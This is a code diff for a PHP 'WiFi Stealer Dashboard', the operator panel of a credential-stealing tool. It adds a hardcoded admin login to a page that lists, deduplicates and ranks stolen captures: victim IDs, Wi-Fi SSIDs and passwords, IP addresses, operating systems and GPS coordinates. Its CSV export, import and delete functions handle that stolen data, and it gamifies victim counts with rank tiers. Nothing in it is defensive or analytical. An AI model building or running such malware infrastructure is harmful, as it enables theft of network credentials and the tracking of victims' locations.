@@ -1,23 +1,172 @@
 <?php
+session_start();
 date_default_timezone_set('Asia/Kolkata');
 
 $logFile = __DIR__ . '/wifi_creds.log';
 
+// ---------- SIMPLE LOGIN CONFIG ----------
+$VALID_USER = 'admin';      // change this
+$VALID_PASS = 'secret123';  // change this
+
+/** Safe HTML escape. */
+function h($v)
+{
+    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
+}
+
+// Handle logout
+if (isset($_GET['action']) && $_GET['action'] === 'logout') {
+    $_SESSION = [];
+    if (ini_get("session.use_cookies")) {
+        $params = session_get_cookie_params();
+        setcookie(session_name(), '', time() - 42000,
+            $params["path"], $params["domain"],
+            $params["secure"], $params["httponly"]
+        );
+    }
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Handle login POST
+$loginError = '';
+if (isset($_POST['login_action']) && $_POST['login_action'] === 'do_login') {
+    $u = $_POST['username'] ?? '';
+    $p = $_POST['password'] ?? '';
+    if ($u === $VALID_USER && $p === $VALID_PASS) {
+        $_SESSION['logged_in'] = true;
+        $_SESSION['login_user'] = $u;
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $loginError = 'Invalid username or password.';
+    }
+}
+
+// If not logged in, show login form and stop
+if (empty($_SESSION['logged_in'])) {
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>WiFi Stealer – Login</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            body {
+                margin: 0;
+                font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+                background: radial-gradient(circle at top left, #0f172a 0, #020617 40%, #000 100%);
+                color: #e5e7eb;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                min-height: 100vh;
+            }
+            .login-card {
+                background: rgba(15,23,42,0.95);
+                border-radius: 12px;
+                border: 1px solid rgba(148,163,184,0.3);
+                box-shadow: 0 22px 45px rgba(15,23,42,0.7);
+                padding: 20px 22px;
+                width: 100%;
+                max-width: 360px;
+            }
+            .login-title {
+                font-size: 20px;
+                font-weight: 600;
+                margin-bottom: 4px;
+            }
+            .login-subtitle {
+                font-size: 12px;
+                color: #9ca3af;
+                margin-bottom: 12px;
+            }
+            .input-group {
+                margin-bottom: 10px;
+            }
+            .input-label {
+                display: block;
+                font-size: 12px;
+                margin-bottom: 4px;
+                color: #e5e7eb;
+            }
+            .input-field {
+                width: 100%;
+                padding: 6px 8px;
+                font-size: 13px;
+                border-radius: 8px;
+                border: 1px solid #4b5563;
+                background:#020617;
+                color:#e5e7eb;
+            }
+            .btn {
+                display: inline-block;
+                border-radius: 999px;
+                padding: 7px 14px;
+                border: 1px solid rgba(148,163,184,0.5);
+                background: linear-gradient(135deg, rgba(15,23,42,0.95), rgba(15,23,42,0.6));
+                color: #e5e7eb;
+                cursor: pointer;
+                font-size: 13px;
+                width: 100%;
+                text-align: center;
+                margin-top: 6px;
+            }
+            .btn:hover {
+                border-color: #4f46e5;
+                box-shadow: 0 0 0 1px rgba(79,70,229,0.5);
+            }
+            .error {
+                font-size: 12px;
+                color: #fecaca;
+                margin-bottom: 8px;
+            }
+            .footer {
+                margin-top: 10px;
+                font-size: 11px;
+                color: #6b7280;
+                text-align: center;
+            }
+        </style>
+    </head>
+    <body>
+    <div class="login-card">
+        <div class="login-title">WiFi Stealer Dashboard</div>
+        <div class="login-subtitle">Login required</div>
+
+        <?php if ($loginError !== ''): ?>
+            <div class="error"><?php echo h($loginError); ?></div>
+        <?php endif; ?>
+
+        <form method="post">
+            <input type="hidden" name="login_action" value="do_login">
+            <div class="input-group">
+                <label class="input-label" for="username">Username</label>
+                <input class="input-field" type="text" id="username" name="username" required>
+            </div>
+            <div class="input-group">
+                <label class="input-label" for="password">Password</label>
+                <input class="input-field" type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="btn">Login</button>
+        </form>
+
+        <div class="footer">
+            © 2026 WiFi Stealer Dashboard – Made By Zypher17
+        </div>
+    </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ---------- BELOW THIS LINE: ORIGINAL DASHBOARD (WITH DEDUP + RANK) ----------
+
 /**
  * Parse a single CSV capture line into a normalized array.
- *
- * CSV order:
- *  0: Timestamp
- *  1: Victim ID
- *  2: SSID
- *  3: Password
- *  4: Victim LAN IP
- *  5: Victim OS
- *  6: Public IP
- *  7: LAN extra
- *  8: Latitude
- *  9: Longitude
- * 10: Packet summary
  */
 function parse_capture_line($line)
 {
@@ -39,7 +188,6 @@ function parse_capture_line($line)
     $longitude   = trim($fields[9] ?? '');
     $pktSummary  = trim($fields[10] ?? '');
 
-    // Filter out header/garbage rows
     $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
     if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
         return null;
@@ -49,7 +197,6 @@ function parse_capture_line($line)
         $pass = '(Not Found)';
     }
 
-    // Normalize/beautify time
     $timestampRaw = $timeStr !== '' ? $timeStr : 'unknown';
     $timestampPretty = $timestampRaw;
     if ($timestampRaw !== 'unknown') {
@@ -57,7 +204,7 @@ function parse_capture_line($line)
         if ($ts !== false) {
             $timestampPretty = date('d M Y, h:i A', $ts);
         }
-    } // [web:200][web:155]
+    }
 
     $passLength   = strlen($pass);
     $allLetters   = ($pass !== '' && ctype_alpha($pass));
@@ -82,12 +229,6 @@ function parse_capture_line($line)
     ];
 }
 
-/** Safe HTML escape. */
-function h($v)
-{
-    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
-}
-
 /** Simple OS detection from user agent (viewer info only). */
 function detectOS($userAgent) {
     $ua = strtolower($userAgent);
@@ -103,22 +244,19 @@ function detectOS($userAgent) {
     return 'Unknown';
 }
 
-// --- 1. CSV EXPORT ---
+// --- CSV EXPORT / IMPORT / CLEAR / DELETE (same as before) ---
 if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
     if (!file_exists($logFile)) {
         die('No data to export.');
     }
-
     $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
     if (empty($rawLines)) {
         die('No captures to export.');
     }
-
     $records = [];
     foreach ($rawLines as $rawLine) {
         $entry = parse_capture_line($rawLine);
         if ($entry === null) continue;
-
         $records[] = [
             $entry['time_raw'],
             $entry['victim_id'],
@@ -133,39 +271,24 @@ if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
             $entry['pkt_summary'],
         ];
     }
-
     if (empty($records)) {
         die('No valid captures to export.');
     }
-
     $filename = 'wifi_captures_' . date('Ymd_Hi') . '.csv';
     header('Content-Type: text/csv; charset=utf-8');
     header('Content-Disposition: attachment; filename="' . $filename . '"');
     $fp = fopen('php://output', 'w');
-
     fputcsv($fp, [
-        'Time',
-        'Victim ID',
-        'SSID',
-        'Password',
-        'Victim LAN IP',
-        'Victim OS',
-        'Public IP',
-        'LAN extra',
-        'Latitude',
-        'Longitude',
-        'Packet summary'
+        'Time','Victim ID','SSID','Password','Victim LAN IP','Victim OS',
+        'Public IP','LAN extra','Latitude','Longitude','Packet summary'
     ]);
-
     foreach ($records as $row) {
         fputcsv($fp, $row);
     }
-
     fclose($fp);
     exit;
 }
 
-// --- 2. CSV IMPORT ---
 $importStatus = null;
 if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
     if (!isset($_FILES['csv_file']) || $_FILES['csv_file']['error'] !== UPLOAD_ERR_OK) {
@@ -194,7 +317,6 @@ if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
     }
 }
 
-// --- 3. Clear all entries ---
 if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
     if (file_exists($logFile)) {
         $handle = fopen($logFile, 'w');
@@ -204,10 +326,8 @@ if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
     exit;
 }
 
-// --- 4. Delete single entry ---
 if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
     $index = isset($_POST['idx']) ? intval($_POST['idx']) : -1;
-
     if (file_exists($logFile) && $index >= 0) {
         $fileLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         if (isset($fileLines[$index])) {
@@ -219,18 +339,16 @@ if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
     exit;
 }
 
-// --- 5. Viewer info ---
+// --- Viewer info ---
 $viewerIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 $viewerUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $viewerOS = detectOS($viewerUA);
 
-// --- 6. Read and parse captures ---
-$rawLines = [];
-if (file_exists($logFile)) {
-    $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-}
+// --- Read & parse, sort, dedup (victim+ssid+password) ---
+$rawLines = file_exists($logFile)
+    ? file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)
+    : [];
 
-// Parse all first
 $parsedEntries = [];
 foreach ($rawLines as $idx => $rawLine) {
     $entry = parse_capture_line($rawLine);
@@ -239,7 +357,6 @@ foreach ($rawLines as $idx => $rawLine) {
     $parsedEntries[] = $entry;
 }
 
-// Sort newest first by raw time
 usort($parsedEntries, function ($a, $b) {
     $ta = strtotime($a['time_raw']);
     $tb = strtotime($b['time_raw']);
@@ -247,31 +364,24 @@ usort($parsedEntries, function ($a, $b) {
     if ($ta === false) return 1;
     if ($tb === false) return -1;
     return $tb <=> $ta;
-}); // [web:155][web:200]
+});
 
-// --- 7. De-duplicate using victim_id + ssid + password ---
-// We keep ONLY the first occurrence (newest) of each combination.
 $captureEntries = [];
 $seenKeys = [];
-
 foreach ($parsedEntries as $entry) {
     $key = $entry['victim_id'] . '|' . $entry['ssid'] . '|' . $entry['password'];
-
-    if (isset($seenKeys[$key])) {
-        continue; // duplicate, skip
-    }
+    if (isset($seenKeys[$key])) continue;
     $seenKeys[$key] = true;
     $captureEntries[] = $entry;
-} // [web:195][web:198]
+}
 
-// Re-index display idx
 foreach ($captureEntries as $i => &$entry) {
     $entry['idx'] = $i;
 }
 unset($entry);
 
-// --- 8. Stats / rank using unique entries only ---
-$totalCaptures       = count($captureEntries); // unique captures
+// --- Stats + rank ---
+$totalCaptures       = count($captureEntries);
 $ssidCount           = [];
 $ipCount             = [];
 $totalPasswordLength = 0;
@@ -284,21 +394,17 @@ foreach ($captureEntries as $entry) {
     if ($entry['ip_main'] !== 'offline') {
         $ipCount[$entry['ip_main']] = ($ipCount[$entry['ip_main']] ?? 0) + 1;
     }
-
     $totalPasswordLength += $entry['len'];
-    if ($entry['weak']) {
-        $weakPasswords++;
-    }
+    if ($entry['weak']) $weakPasswords++;
 }
 
 $uniqueSSIDs     = count($ssidCount);
 $uniqueIPs       = count($ipCount);
 $avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
 $weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
-
 $uniqueRankCount = $totalCaptures;
 
-// --- 9. Filters from query ---
+// Filters
 $filter_ssid    = isset($_GET['ssid'])  ? trim($_GET['ssid'])  : '';
 $filter_ip      = isset($_GET['ip'])    ? trim($_GET['ip'])    : '';
 $filter_os_f    = isset($_GET['os'])    ? trim($_GET['os'])    : '';
@@ -312,11 +418,10 @@ foreach ($captureEntries as $entry) {
         stripos($entry['public_ip'], $filter_ip) === false) continue;
     if ($filter_os_f !== '' && stripos($entry['os'], $filter_os_f) === false) continue;
     if ($filter_victim !== '' && stripos($entry['victim_id'], $filter_victim) === false) continue;
-
     $filteredEntries[] = $entry;
 }
 
-// --- 10. Rank from uniqueRankCount ---
+// Rank tiers
 if ($uniqueRankCount <= 10) {
     $rankName  = 'Rookie';
     $rankPct   = ($uniqueRankCount / 10) * 25;
@@ -332,7 +437,7 @@ if ($uniqueRankCount <= 10) {
 }
 $rankPct = round(min(100, max(5, $rankPct)), 1);
 
-// --- 11. JS details payload (no map now) ---
+// Details payload
 $jsDetails = [];
 foreach ($filteredEntries as $entry) {
     $jsDetails[] = [
@@ -344,11 +449,6 @@ foreach ($filteredEntries as $entry) {
         'os'         => $entry['os'],
     ];
 }
-
-$jsRankName      = $rankName;
-$jsRankPct       = $rankPct;
-$jsTotalCaptures = $uniqueRankCount;
-
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -356,7 +456,6 @@ $jsTotalCaptures = $uniqueRankCount;
     <meta charset="UTF-8">
     <title>WiFi Stealer Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-
     <style>
         body {
             margin: 0;
@@ -546,9 +645,9 @@ $jsTotalCaptures = $uniqueRankCount;
         var REFRESH_INTERVAL = 10000;
 
         window.captureDetails = <?php echo json_encode($jsDetails); ?>;
-        window.rankName       = <?php echo json_encode($jsRankName); ?>;
-        window.rankPct        = <?php echo json_encode($jsRankPct); ?>;
-        window.totalCaptures  = <?php echo json_encode($jsTotalCaptures); ?>;
+        window.rankName       = <?php echo json_encode($rankName); ?>;
+        window.rankPct        = <?php echo json_encode($rankPct); ?>;
+        window.totalCaptures  = <?php echo json_encode($uniqueRankCount); ?>;
 
         function toggleAutoRefresh(enabled) {
             autoRefresh = enabled;
@@ -624,6 +723,7 @@ $jsTotalCaptures = $uniqueRankCount;
                 Captures: <?php echo h($totalCaptures); ?> • Timezone: IST
             </div>
             <div class="viewer-meta">
+                Logged in as <?php echo h($_SESSION['login_user'] ?? ''); ?> •
                 You are viewing from IP <?php echo h($viewerIP); ?> on <?php echo h($viewerOS); ?>
             </div>
         </div>
@@ -649,6 +749,8 @@ $jsTotalCaptures = $uniqueRankCount;
                     Clear all history
                 </button>
             </form>
+
+            <a href="?action=logout" class="btn btn-sm btn-danger">Logout</a>
         </div>
     </div>
 
@@ -658,7 +760,6 @@ $jsTotalCaptures = $uniqueRankCount;
         </div>
     <?php endif; ?>
 
-    <!-- FILTERS -->
     <div class="card">
         <form method="get" style="display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom:4px;">
             <input type="text" name="vid" placeholder="Filter Victim ID"
